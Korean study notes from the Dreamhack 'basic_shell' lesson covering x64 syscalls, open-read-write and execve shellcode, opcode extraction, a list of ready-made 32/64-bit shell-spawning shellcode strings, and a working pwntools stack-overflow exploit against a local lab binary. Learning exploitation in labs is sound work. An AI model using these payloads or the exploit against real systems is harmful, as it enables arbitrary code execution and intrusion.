
[[Dreamhack - basic_shell]]
# syscall
시스템 콜은 함수
필요한 기능과 인자에 대한 정보를 레지스터로 전달하면, 커널이 이를 읽어서 요청을 처리
리눅스에서는 x64아키텍처에서 `rax`로 무슨 요청인지 나타내고, 아래의 순서대로 필요한 인자를 전달함

**요청:** rax
**인자 순서:** rdi → rsi → rdx → rcx → r8 → r9 → stack

![[Pasted image 20231024221325.png]]

syscall table을 보면, rax가 0x1일 때, 커널에 write 시스템콜을 요청함
이때 rdi, rsi, rdx가 0x1, 0x401000, 0xb 이므로 커널은 write(0x1, 0x401000, 0xb)를 수행하게 됨
write함수의 각 인자는 출력 스트림, 출력 버퍼, 출력 길이
여기서 0x1은 stdout이며, 이는 일반적으로 화면을 의미
0x401000에는 Hello World가 저장되어 있고, 
길이는 0xb로 지정되어 있으므로, 
화면에 Hello World가 출력됨


# x64 syscall 테이블
총 갯수가 300개 이상
필요할 때 검색하면 됨

|**syscall**|**rax**|**arg0 (rdi)**|**arg1 (rsi)**|**arg2 (rdx)**|
|---|---|---|---|---|
|read|0x00|unsigned int fd|char `*`buf|size_t count|
|write|0x01|unsigned int fd|const char `*`buf|size_t count|
|open|0x02|const char `*`filename|int flags|umode_t mode|
|close|0x03|unsigned int fd|||
|mprotect|0x0a|unsigned long start|size_t len|unsigned long prot|
|connect|0x2a|int sockfd|struct sockaddr `*` addr|int addrlen|
|execve|0x3b|const char `*`filename|const char `*`const `*`argv|const char *const *envp|

인자 가능한 설정 확인 주소
https://code.woboq.org/userspace/glibc/bits/fcntl.h.html#24


# orw shellcode
`"/tmp/flag"`를 읽는 셸코드를 작성
```c
char buf[0x30]; 
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

## `int fd = open("/tmp/flag", RD_ONLY, NULL)`
1. `"/tmp/flag"`라는 문자열을 메모리에 위치시키기
`"/tmp/flag"` 라는 문자열을 리틀엔디언으로 표현하면 `0x616c662f706d742f67`
스택에 `0x616c662f706d742f67(/tmp/flag)`를 push
하지만 스택에는 8 바이트 단위로만 값을 push할 수 있으므로 
`0x67`("g")를 우선 push한 후, `0x616c662f706d742f`("alf/pmt/")를 push

2. 첫 번째 인자 설정
rdi가 이를 가리키도록 rsp를 rdi로 옮김

3. 두 번째 인자 설정
O_RDONLY는 0이므로, rsi는 0으로 설정

4. 세 번째 인자 설정
파일을 읽을 때, mode는 의미를 갖지 않으므로 rdx는 0으로 설정

5. syscall 값 설정
rax를 open의 syscall 값인 2로 설정

```
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp ; rdi = "/tmp/flag"
xor rsi, rsi ; rsi = 0 ; RD_ONLY
xor rdx, rdx ; rdx = 0
mov rax, 2 ; rax = 2 ; syscall_open
syscall ; open("/tmp/flag", RD_ONLY, NULL)
```

여기서 `push 0x67`은 실제로 메모리에선 앞에 패딩(0x00)이 들어가고 그 패딩이 곧 널값이 되어 문자열 종료를 인식할 수 있게 됨 
만약 `push 0x67` 자리에 `push 0x6767676767676767` 와 같이 패딩이 들어갈 수 없는 형태라면 뒤에 널값을 따로 추가해 줘야 함

`mov rax, 0x616c662f706d742f `
`push rax`
이 아닌
`push 0x616c662f706d742f`
도 괜찮아 보임

## `read(fd, buf, 0x30)`
syscall의 반환 값은 rax로 저장됨
따라서 `open`으로 획득한 /tmp/flag의 fd는 rax에 저장되었음

```
mov rdi, rax ; rdi = fd
mov rsi, rsp
sub rsi, 0x30 ; rsi = rsp-0x30 ; buf
mov rdx, 0x30 ; rdx = 0x30 ; len
mov rax, 0x0 ; rax = 0 ; syscall_read
syscall ; read(fd, buf, 0x30)
```


## `write(1, buf, 0x30)`
```
mov rdi, 1 ; rdi = 1 ; fd = stdout
mov rax, 0x1 ; rax = 1 ; syscall_write
syscall ; write(fd, buf, 0x30)
```


이를 모두 종합하면 아래와 같음
```
;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp ; rdi = "/tmp/flag"
xor rsi, rsi ; rsi = 0 ; RD_ONLY
xor rdx, rdx ; rdx = 0
mov rax, 2 ; rax = 2 ; syscall_open
syscall ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax ; rdi = fd
mov rsi, rsp
sub rsi, 0x30 ; rsi = rsp-0x30 ; buf
mov rdx, 0x30 ; rdx = 0x30 ; len
mov rax, 0x0 ; rax = 0 ; syscall_read
syscall ; read(fd, buf, 0x30)

mov rdi, 1 ; rdi = 1 ; fd = stdout
mov rax, 0x1 ; rax = 1 ; syscall_write
syscall ; write(fd, buf, 0x30)
```

```
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall

mov rdi, 1
mov rax, 0x1
syscall
```

지금 작성한 어셈블리 코드는 기계어로 치환하여 컴파일러가 읽을 수 있으나, ELF 형식이 아니므로 리눅스에서 실행 불가
이를 gcc컴파일을 통해 ELF 형식으로 변형해야 함

많은 방법 중 하나인 스켈레톤 코드를 사용
## 스켈레톤 코드
어셈블리 코드를 컴파일하는 방법에는 여러 가지 방법 중 하나
핵심 내용이 비어있는, 기본 구조만 갖춘 코드

```c
// File name: sh-skeleton.c
// Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel 
__asm__( 
	".global run_sh\n" 
	"run_sh:\n" 
	"Input your shellcode here.\n"
	"Each line of your shellcode should be\n"
	"seperated by '\n'\n" 
	"xor rdi, rdi # rdi = 0\n" 
	"mov rax, 0x3c # rax = sys_exit\n" 
	"syscall # exit(0)"); 
	
void run_sh();
 
int main() { run_sh(); }
```

```c
__asm__( 
	".global run_sh\n" 
	"run_sh:\n" 

	
void run_sh();
 
int main() { run_sh(); }
```

## 스켈레톤 코드 적용
```
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```
    
```sh
echo 'flag{this_is_open_read_write_shellcode!}' > /tmp/flag

$ gcc -o orw orw.c -masm=intel
$ ./orw
flag{this_is_open_read_write_shellcode!}
```



# 쉘코드 to .asm
```python
def assembly_to_c_format(assembly_code):
    formatted_code = "__asm__(\n"
    formatted_code += '    ".global run_sh\\n"\n'
    formatted_code += '    "run_sh:\\n"\n\n'

    for line in assembly_code.strip().split("\n"):
        formatted_code += f'    "{line}\\n"\n'

    formatted_code += '    "\\n"\n'  # Separate syscall lines
    formatted_code += '    "xor rdi, rdi"\n'
    formatted_code += '    "mov rax, 0x3c"\n'
    formatted_code += '    "syscall");\n\n'

    formatted_code += "void run_sh();\n\n"
    formatted_code += "int main() { run_sh(); }\n"

    return formatted_code


assembly_code = """
push 0x00
push 0x676E6F6F6F6F6F6F
push 0x6C5F73695F656D61
push 0x6E5F67616C662F63
push 0x697361625F6C6C65
push 0x68732F656D6F682F
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall

mov rdi, 1
mov rax, 0x1
syscall
"""

formatted_code = assembly_to_c_format(assembly_code)
print(formatted_code)

```


## 메모리 릭
초기화되지 않은 메모리 영역 사용
위의 예시에서 `/tmp/flag`의 데이터 외에 알 수 없는 문자열이 출력되는 경우가 있는데,
이는 메모리 릭의 의한 것
스택에서 해제라는 것은 사용한 영역을 0으로 초기화하는 것이 아니라, 단순히 rsp와 rbp를 호출한 함수의 것으로 이동시키는 것이기 때문에
어떤 함수를 해제한 이후, 다른 함수가 스택 프레임을 그 위에 할당하면, 이전 스택 프레임의 데이터는 여전히 새로 할당한 스택 프레임에 존재하게 됨
이를 쓰레기 값이라고 표

```sh
$ ./orw
flag{this_is_open_read_write_shellcode!}&��U
```


# execve shellcode
일반적인 쉘코드
`execve(“/bin/sh”, null, null)`를 실행시키면 됨

|**syscall**|**rax**|**arg0 (rdi)**|**arg1 (rsi)**|**arg2 (rdx)**|
|---|---|---|---|---|
|execve|0x3b|const char *filename|const char *const *argv|const char *const *envp|

argv는 실행파일에 넘겨줄 인자, envp는 환경변수
sh만 실행하면 되므로 다른 값들은 전부 null로 설정해줘도 됨
```
;Name: execve.S

mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

```
// File name: execve.c
// Compile Option: gcc -o execve execve.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp  # rdi = '/bin/sh'\n"
    "xor rsi, rsi  # rsi = NULL\n"
    "xor rdx, rdx  # rdx = NULL\n"
    "mov rax, 0x3b # rax = sys_execve\n"
    "syscall       # execve('/bin/sh', null, null)\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
```

```sh
bash$ gcc -o execve execve.c -masm=intelbash$ ./execvesh$ id uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
```



# `-masm [att/intel]`
C를 작성할 때, assembly code를 직접 넣을 경우가 생김
이때 X86 assembly의 원하는 형식(일반적으로 intel / AT&T 방식 중 하나)을 해석할 수 있도록 `-masm [att/intel]` 옵션을 추가

```c
#include<stdio.h>

void gadget(){
    __asm__("mov eax, 1");
    __asm__("syscall");
}
..
gcc -o main main.c -masm=intel
```

```c
#include<stdio.h>

void gadget(){
    __asm__("movl #1, %eax");
    __asm__("syscall");
}
..
gcc -o main main.c -masm=att (default 값은 att)
```


# objdump 를 이용한 shellcode 추출
작성한 어셈블리 shellcode를 byte code(opcode)의 형태로 추출하는 방법

아래 어셈블리 코드는 특정 리눅스 시스템 콜을 사용하여 `/bin/sh` (쉘)을 실행하는 쉘코드
`mov al, 0xb`는 `al`에 11(0xb)을 저장, 여기서 11은 `execve` 시스템 콜의 번호
`int 0x80`는 시스템 콜
```
; File name: shellcode.asm
section .text
global _start
_start:
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb
int 0x80
```

nasm은 인텔 x86 아키텍처를 위한 어셈블러
주로 Intel 문법을 사용하여 소스 코드를 작성하고, 이를 기계어 코드(ELF형식의 오브젝트 파일)로 변환
`objdump` 도구를 사용하여 `shellcode.o`의 디스어셈블 결과를 출력
```sh
$ sudo apt-get install nasm 
$ nasm -f elf shellcode.asm
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
$ 
```

`objcopy`는 바이너리 파일의 형식을 변환하거나, 바이너리 파일에서 특정 섹션을 추출하거나, 다양한 변환 작업을 수행하는 도구
여기서는 `shellcode.o` 오브젝트 파일의 `.text` 섹션(코드 섹션)을 `shellcode.bin`이라는 파일로 추출함
결과적으로 어셈블리 코드가 어셈블된 기계어 코드(바이너리 데이터)만 추출되어 `shellcode.bin` 파일에 저장
`xxd`는 바이너리 파일의 내용을 16진수 형식으로 표시하거나, 16진수로 표시된 데이터를 바이너리 형식으로 변환하는 도구
```sh
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
$
```

```sh
# execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

# 있는 쉘코드 이용하기
구글링하면 이미 쉘코드가 많이 있음
## 32bit shellcode
- 6 Bytes Shell Code 
`\x31\xc0\xb0\x01\xcd\x80`

- 25 Bytes Shell Code (기본 쉘코드)
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`
 
- 26 Bytes Shell Code (scanf 우회 쉘코드)
`\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80`
scanf는 0x0b를 필터링하는 특징이 있는데, 기본 쉘코드에서 0x0b를 가지고 있으므로 해당 부분을 변형함

- 41 Bytes Shell Code   (setreuid(geteuid(), getreuid()) 포함)
`\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`

- 48 Bytes Shell Code  (\x2f가 없는 쉘코드)
`\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81`

 
## 64bit shellcode
- 23 Bytes Shell Code (기본 쉘코드)
`\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05`

x64
- 31 Bytes Shell Code
`\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05`


위의 쉘코드 와 pwntool을 이용하여 아래의 바이너리를 exploit할 수 있음
```c
#include <stdio.h>

int main(void){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    char buf[100];

    printf("%p", buf);
    read(0, buf, 200);

    return 0;
}
```

살펴보면, 버퍼는 크기는 100바이트지만, 실제로 입력받는 값은 200바이트라 버퍼오버플로우 취약점이 발생함 이를 이용하여 
`버퍼 + SFP + RET`
의 구조를
`쉘코드 + 쓰레기값 + 쉘코드 시작 위치`
로 공격할 계획임
하지만 한 가지 고려해야할 점이 있는데, ASLR이 적용되어 있어서 주소들이 램덤하게 배치되어 있음
따라서 공격할 때 쉘코드의 위치를 특정하기가 어려운데,
`printf("%p", buf);` 에서 buf의 시작 위치를 알려주기 때문에 pwntool을 이용해 동적으로 주소를 얻어와 이용할 수 있음

먼저 `file` 명령어를 통해 해당 바이너리의 아키텍쳐를 확인함 
32비트 아키텍쳐, 인텔, SYSV, dynamic link 등등의 정보를 알 수 있음
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/shellcode_ex/shellcode_ex]
└─$ file test 
test: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e7ace1344a5a4c5b4d404cd4d2b238c9287366f8, for GNU/Linux 3.2.0, not stripped
```

해당 아키텍처에 맞는 32비트 아키텍쳐 전용 25바이트 기본 쉘코드를 사용
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`

다음으로 gdb로 디스어셈블하면, 실제로 버퍼가 100이 잡혀있는 것을 확인 할 수 있음
따라서 버퍼 100바이트 SFP 4바이트 그 다음 RET가 나옴을 예상할 수 있음
```
gef➤  disas main
Dump of assembler code for function main:
   0x08049186 <+0>:	push   ebp
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	sub    esp,0x64
   0x0804918c <+6>:	mov    eax,ds:0x804c020
   0x08049191 <+11>:	push   0x0
   0x08049193 <+13>:	push   0x2
   0x08049195 <+15>:	push   0x0
   0x08049197 <+17>:	push   eax
   0x08049198 <+18>:	call   0x8049060 <setvbuf@plt>
   0x0804919d <+23>:	add    esp,0x10
   0x080491a0 <+26>:	mov    eax,ds:0x804c024
   0x080491a5 <+31>:	push   0x0
   0x080491a7 <+33>:	push   0x2
   0x080491a9 <+35>:	push   0x0
   0x080491ab <+37>:	push   eax
   0x080491ac <+38>:	call   0x8049060 <setvbuf@plt>
   0x080491b1 <+43>:	add    esp,0x10
   0x080491b4 <+46>:	lea    eax,[ebp-0x64]
   0x080491b7 <+49>:	push   eax
   0x080491b8 <+50>:	push   0x804a008
   0x080491bd <+55>:	call   0x8049050 <printf@plt>
   0x080491c2 <+60>:	add    esp,0x8
   0x080491c5 <+63>:	push   0xc8
   0x080491ca <+68>:	lea    eax,[ebp-0x64]
   0x080491cd <+71>:	push   eax
   0x080491ce <+72>:	push   0x0
=> 0x080491d0 <+74>:	call   0x8049040 <read@plt>
   0x080491d5 <+79>:	add    esp,0xc
   0x080491d8 <+82>:	mov    eax,0x0
   0x080491dd <+87>:	leave  
   0x080491de <+88>:	ret    
End of assembler dump.
```

그러나 확실하지 않으므로 동적분석으로 다시 확인 해보면,
입력값을 쓰레기 값으로 넣었을 때, 현재 실행에서 버퍼의 시작 위치는 `0xffffcea4`을 확인할 수 있고,
ebp가 `0xffffcf08`가 이므로 버퍼의 시작 위치와 스텍의 끝 위치의 차이가 0x64 임을 알 수 있음
해당 주소의 값들 자체는 매번 변할 순 있지만, 그 차이는 일정함
```sh
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x13      
$ebx   : 0xf7e26000  →  0x00225dac
$ecx   : 0xffffcea4  →  "aaaaaaaaaaaaaaaaaa\n"
$edx   : 0xc8      
$esp   : 0xffffce98  →  0x00000000
$ebp   : 0xffffcf08  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffcfc4  →  0xffffd1a1  →  "/home/foo1/Desktop/kknock/Pwnable/shellcode_ex/she[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x080491d5  →  <main+79> add esp, 0xc
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce98│+0x0000: 0x00000000	 ← $esp
0xffffce9c│+0x0004: 0xffffcea4  →  "aaaaaaaaaaaaaaaaaa\n"
0xffffcea0│+0x0008: 0x000000c8
0xffffcea4│+0x000c: "aaaaaaaaaaaaaaaaaa\n"
0xffffcea8│+0x0010: "aaaaaaaaaaaaaa\n"
0xffffceac│+0x0014: "aaaaaaaaaa\n"
0xffffceb0│+0x0018: "aaaaaa\n"
0xffffceb4│+0x001c: "aa\n"
───────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80491cd <main+71>        push   eax
    0x80491ce <main+72>        push   0x0
    0x80491d0 <main+74>        call   0x8049040 <read@plt>
 →  0x80491d5 <main+79>        add    esp, 0xc
    0x80491d8 <main+82>        mov    eax, 0x0
    0x80491dd <main+87>        leave  
    0x80491de <main+88>        ret    
    0x80491df                  add    BYTE PTR [ebx-0x7d], dl
    0x80491e2 <_fini+2>        in     al, dx
───────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "test", stopped 0x80491d5 in main (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80491d5 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

```sh
gef➤  x/80x 0xffffcea4
0xffffcea4:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffceb4:	0x000a6161	0x01000000	0x0000000b	0xf7fc4540
0xffffcec4:	0x00000000	0xf7c184be	0xf7e26054	0xf7fbe4a0
0xffffced4:	0xf7fd6f20	0xf7c184be	0xf7fbe4a0	0xffffcf20
0xffffcee4:	0xf7fbe66c	0xf7fbeb10	0x00000001	0x00000001
0xffffcef4:	0x00000000	0xf7e26000	0xf7d1ea8b	0xffffd1a1
0xffffcf04:	0x00000070	0xf7ffd020	0xf7c21519	0x00000001
0xffffcf14:	0xffffcfc4	0xffffcfcc	0xffffcf30	0xf7e26000
0xffffcf24:	0x0804909d	0x00000001	0xffffcfc4	0xf7e26000
0xffffcf34:	0xffffcfc4	0xf7ffcb80	0xf7ffd020	0x6aa18649
0xffffcf44:	0x11160c59	0x00000000	0x00000000	0x00000000
0xffffcf54:	0xf7ffcb80	0xf7ffd020	0xa75cbb00	0xf7ffda40
0xffffcf64:	0xf7c214a6	0xf7e26000	0xf7c215f3	0x00000000
0xffffcf74:	0x0804bf04	0xffffcfcc	0xf7ffd020	0x00000000
0xffffcf84:	0xf7fd8f94	0xf7c2156d	0x0804bff4	0x00000001
0xffffcf94:	0x08049070	0x00000000	0x08049098	0x0804909d
0xffffcfa4:	0x00000001	0xffffcfc4	0x00000000	0x00000000
0xffffcfb4:	0xf7fcaaa0	0xffffcfbc	0xf7ffda40	0x00000001
0xffffcfc4:	0xffffd1a1	0x00000000	0xffffd1e2	0xffffd1f2
0xffffcfd4:	0xffffd260	0xffffd273	0xffffd287	0xffffd2b4
```

위의 정보들을 이용하여 쉘코드를 작성하면, 아래와 같음
```python
from pwn import *


shellcode=b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

#p = gdb.debug('./test')

p = process('./test')
#context.log_level = 'debug'

origin=p.recv(10)[2:]
shellcode_address = p32(int(origin,16))

shellcode+=b'a'*(104-len(shellcode))
shellcode+=shellcode_address

p.sendline(shellcode)
p.interactive()
```

쉘코드는 기본적으로 리틀엔디언으로 표현되어 있기 때문에 그대로 사용하면 됨
하지만 쉘로  출력되는 주소값은 그러한 표현법을 고려하지 않은 순수한 주소임
따라서 적절한 바이트 처리를 해줘야 함
```python
origin=p.recv(10)[2:]
shellcode_address = p32(int(origin,16))
```

그 다음 쉘코드와 쓰레기값의 합이 104가 되게 만들고 그 뒤에 실행 중에 얻게된 쉘코드 주소를 넣음

```python
shellcode+=b'a'*(104-len(shellcode))
shellcode+=shellcode_address
```

마지막으로 쉘코드를 입력값으로 넣고 interactive()를 실행
```python
p.sendline(shellcode)
p.interactive()
```

실행 결과
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/shellcode_ex/shellcode_ex]
└─$ python3 exploit.py 
[+] Starting local process './test': pid 69048
108
b'1\xc0\xb01\xcd\x80\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe11\xd2\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4\x1c\xf7\xff'
[*] Switching to interactive mode
$ id
uid=1000(foo1) gid=1000(foo1) groups=1000(foo1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),138(docker)
$  
```




# system(), bin/sh 찾기

```bash
ldd ./target
shared_library 	/lib/i386-linux-gnu/libc.so.6

strings -tx [shared_library] | grep "bin/sh"
/bin/sh		0x15bb2b

gdb [shared_library]
print system
system		0x3adb0

p/x 0x15bb2b-0x3adb0
$2=0x120d7b

diff		0x120d7b

gdb target
r
print system
0xf7630db0

p/x 0xf7630db0 + 0x120d7b
0xf7751b2b

x/s 0xf7751b2b
"/bin/sh"
```



# 팁
- 레지스터 0 초기화
`xor rdi, rdi`

- sys_exit
`mov rax, 0x3c` 후 `syscal`
